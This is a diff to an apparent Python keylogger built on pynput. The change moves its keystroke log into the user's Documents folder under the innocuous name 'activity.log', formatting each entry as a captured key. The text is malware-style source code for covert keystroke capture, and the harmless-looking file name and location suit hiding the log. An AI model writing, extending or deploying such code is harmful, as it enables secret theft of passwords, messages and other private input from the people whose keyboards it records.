@@ -1,7 +1,8 @@
+
 import logging
 from pynput import keyboard
 import threading
-
+import os
 
 class Keylogger:
 
@@ -35,9 +36,12 @@ def run_keylogger():
 
 if __name__ == '__main__':
 
+    documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
+    log_file_path = os.path.join(documents_path, 'activity.log')
+    
     logging.basicConfig(
         level=logging.DEBUG,
-        filename='activity.log',
+        filename=log_file_path,
         format='Key: %(message)s',
     )
     
